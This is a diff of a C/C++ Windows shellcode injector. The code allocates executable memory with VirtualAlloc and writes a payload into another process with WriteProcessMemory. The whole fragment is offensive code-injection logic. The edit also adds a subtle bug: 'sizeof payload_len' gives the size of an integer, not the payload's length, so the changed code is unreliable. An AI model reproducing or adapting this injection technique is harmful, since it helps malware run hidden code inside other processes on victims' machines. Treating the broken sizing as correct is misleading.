@@ -60,7 +60,7 @@ unsigned int payload_len = sizeof(payload);
 
   // Allocate a block of memory that can store our shellcode
   LPVOID bufferAddress = VirtualAlloc(
-      NULL, sizeof buf, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+      NULL, sizeof payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
   if (bufferAddress == NULL) {
     printf("[ERROR] Failed to allocate memory within the process (PID: %u)! "
            "Error: %lu\n",
@@ -73,7 +73,7 @@ unsigned int payload_len = sizeof(payload);
   // Write the shellcode to the block of memory that we allocated with
   // VirtualAlloc
   BOOL writeShellcode =
-      WriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
+      WriteProcessMemory(pHandle, bufferAddress, payload, sizeof payload_len, NULL);
   if (writeShellcode == false) {
     printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, "
            "Error: %lu\n",
